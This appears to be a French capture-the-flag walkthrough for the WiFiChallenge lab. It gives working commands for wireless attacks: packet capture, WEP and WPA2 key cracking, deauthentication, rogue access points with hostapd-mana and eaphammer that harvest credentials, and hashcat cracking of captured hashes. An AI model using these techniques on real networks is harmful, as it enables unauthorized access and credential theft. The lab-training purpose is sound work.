# lab.wifichallenge.com

Téléchargement de la VM : https://drive.proton.me/urls/Q4WPB23W7R#Qk4nxMH8Q4oQ

## Challenges 

### 1) Reconnaissance

#### Lister les clients et voir le canal de "wifi-global"

Capturer tous les paquets du réseau :

    sudo airmon-ng check kill
    sudo airmon-ng start wlan0
    
    airodump-ng wlan0mon -w scan --manufacturer --wps --band abg
    # --band abg permet de scanner 2,4Ghz et 5Ghz
    
Isoler le canal 44 si besoin : 

    airodump-ng wlan0mon -w scan --manufacturer --wps --band abg -c44


#### Obtenir l'adresse MAC du client "wifi-IT"

On capture les paquets comme avant puis on isole le canal 11 : 

    airodump-ng wlan0mon -w recon --manufacturer --wps --band abg
    airodump-ng wlan0mon -w recon --manufacturer --wps --band abg -c11
    
Création d'une base de données locale avec les résultats de la capture : 
    
    python3 ~/tools/wifi_db/wifi_db.py -d wifi.db ./recon*
    sqlitebrowser wifi.db
    
Il n'y a ensuite plus qu'à chercher le point d'accès voulu dans les différentes tables.

#### Trouver le probe de 78:C1:A7:BF:72:46

Même démarche qu'avant : 

    sudo airmon-ng check kill
    sudo airmon-ng start wlan0
    airodump-ng wlan0mon -w recon --manufacturer --wps --band abg
    python3 ~/tools/wifi_db/wifi_db.py -d wifi.db ./recon*
    sqlitebrowser wifi.db
    
#### Donner le ESSID du point d'accès caché 

On sait que l'adresse MAC du réseau est F0:9F:C2:6A:88:26

Identifier le canal du réseau :

    airodump-ng wlan0mon

Changement de canal et bruteforcing des noms avec mdk4 :

    iwconfig wlan0mon channel 11
    
    cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt
    
    mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt

### 2) WEP

Le chiffrement WEP est vulnérable parce que chaque paquet transmis contient un IV (vecteur d'initialisation), et avec suffisamment de paquets capturés, il est possible de deviner la clé WEP. Le but est donc de capturer le plus de paquets possible pour extraire ces IVs et ensuite les utiliser pour craquer la clé WEP.

Si il n'y a aucun client, et donc peu de paquets, on peut quand même passer par les techniques d'injection de paquets ou de fake authentication. 

#### Trouver le flag de "wifi-old"

Reconnaissance : 

    sudo airmon-ng check kill
    sudo airmon-ng start wlan0
    airodump-ng wlan0mon -w wep --manufacturer --wps --band abg
    
On voit bien une ligne sur un réseau WEP : 

>  F0:9F:C2:71:22:11  -28       50     1795    0   3   54   WEP  WEP                wifi-old              Ubiquiti Networks Inc. 
    
    
Capture spécifique :

    airodump-ng wlan0mon -w wep --manufacturer --wps --band abg --bssid F0:9F:C2:71:22:11
    
On voit une station DA:92:58:2A:BF:A3 connectée.

Attaque à faire en parallèle pour désauthentifier les clients et capturer plus de données plus vite :
  
    aireplay-ng --deauth 10 -a F0:9F:C2:71:22:11 -c DA:92:58:2A:BF:A3 wlan0mon

Attaque finale avec Aircrack : 

    sudo aircrack-ng wep-01.cap

Après un peu d'attente on obtient bien la clé :

> KEY FOUND! [ 11:BB:33:CD:55 ] 

Connexion finale à ce point d'accès : 

    sudo airmon-ng stop wlan0mon  
    sudo apt install wpasupplicant
    sudo systemctl restart wpa_supplicant.service
    sudo systemctl restart network*
    sudo vim /etc/wpa_supplicant/wep.conf

Contenu du fichier : 

    network={
            ssid="wifi-old"
            key_mgmt=NONE
            wep_key0=11BB33CD55
            wep_tx_keyidx=0
    }

Connexion : 

     wpa_supplicant -D nl80211 -i wlan2 -c /etc/wpa_supplicant/wep.conf
     sudo dhclient wlan1 -v

### 3) WPA2 PSK

#### Obtenir le mot de passe de "wifi-mobile"

Capture : 

    sudo su
    airmon-ng check kill
    airmon-ng start wlan0
    airodump-ng wlan0mon -w psk --manufacturer --wps --band abg
    airodump-ng wlan0mon -w psk --manufacturer --wps --band abg -c 6
    

Désauthentification : 

    aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
    

Bruteforcing de la clé : 

    aircrack-ng psk-01.cap -w ~/rockyou-top100000.txt


#### Obtenir l'IP du serveur web dans ce réseau

Utilisation de airdecap-ng pour déchiffrer le trafic, grâce à la clé précédemment obtenue : 

    airdecap-ng -e wifi-mobile -p starwars1 psk-01.cap
    
Analyse du trafic déchiffré avec Wireshark : 

    wireshark psk-01-dec.cap

#### Se connecter au site web et trouver le flag

Connexion avec wpa_supplicant : 

    wpa_supplicant -Dnl80211 -iwlan3 -c psk_1.conf
    dhclient wlan3 -v

Contenu de psk_1.conf :

    network={
        ssid="wifi-mobile"
        psk="starwars1"
        scan_ssid=1
        key_mgmt=WPA-PSK
        proto=WPA2
    }

Une fois sur le site, utiliser le cookie trouvé dans Wireshark.

#### Exploiter le manque d'isolation de ce réseau

Utilisation de l'outil arp-scan pour trouver l'IP du deuxième serveur web :

    arp-scan -I wlan3 -l
    curl 192.168.2.9
    
    
### 4) WPA2 PSK - Réseau distant à usurper

#### Trouver le mot de passe de "wifi-offices"

Le réseau "wifi-offices" n'est pas dans la liste initiale, mais on voit quelques communications avec lui apparaître avec airodump-ng : 


     (not associated)   B4:99:BA:6F:F9:45  -49    0 - 6     81      273         wifi-offices,Jason                                          
     (not associated)   78:C1:A7:BF:72:46  -49    0 - 6     84      280         wifi-offices,Jason 


Soit il est à un autre endroit, soit il a été coupé. 

Utilisation de hostapd-mana pour créer un faux point d'accès : 

    hostapd-mana wifi-offices.conf
    
Contenu de wifi-offices.conf : 

    interface=wlan1
    driver=nl80211
    hw_mode=g
    channel=1
    ssid=wifi-offices
    mana_wpaout=hostapd.hccapx
    wpa=2
    wpa_key_mgmt=WPA-PSK
    wpa_pairwise=TKIP CCMP
    wpa_passphrase=12345678


Faire un Ctrl+C pour couper l'outil dès que l'on voit la ligne suivante : 

> AP-STA-POSSIBLE-PSK-MISMATCH

Bruteforcing du handshake : 

    hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force

### 5) WPA2 MGT

MGT = Mode d'authentification Management basé sur des certificats ou un serveur d'authentification externe.

#### Trouver le flag de Juan sur "wifi-corp"

Utilisation de l'outil eaphammer pour créer un faux point d'accès : 

    python3 tools/eaphammer/eaphammer --cert-wizard
    python3 tools/eaphammer/eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced

Attendre un peu ou faire une désauthentification.

On reçoit bien un hash : 

    wlan3: STA 64:32:a8:07:6c:40 IEEE 802.11: authenticated
    wlan3: STA 64:32:a8:07:6c:40 IEEE 802.11: associated (aid 1)
    wlan3: CTRL-EVENT-EAP-STARTED 64:32:a8:07:6c:40
    wlan3: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
    wlan3: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25


    mschapv2: Mon Oct  7 10:20:06 2024
         domain\username:		CONTOSO\juan.tr
         username:			juan.tr
         challenge:			1d:a2:a4:8c:cc:21:37:3a
         response:			0e:12:b9:ef:48:bc:ef:cf:bd:06:15:8e:11:7c:3e:93:96:ba:47:8a:71:55:f7:6a

         jtr NETNTLM:			juan.tr:$NETNTLM$1da2a48ccc21373a$0e12b9ef48bcefcfbd06158e117c3e9396ba478a7155f76a

         hashcat NETNTLM:		juan.tr::::0e12b9ef48bcefcfbd06158e117c3e9396ba478a7155f76a:1da2a48ccc21373a


Bruteforcing du hash obtenu : 

    hashcat -a 0 -m 5500 juan.tr::::0e12b9ef48bcefcfbd06158e117c3e9396ba478a7155f76a:1da2a48ccc21373a ~/rockyou-top100000.txt --force


#### Faire un bruteforcing sur l'utilisateur CONTOSOLAB\test

Utilisation de l'outil air-hammer pour le bruteforcing : 

    echo 'CONTOSOLAB\test' > user.txt
    python3 tools/air-hammer/air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u user.txt 
    
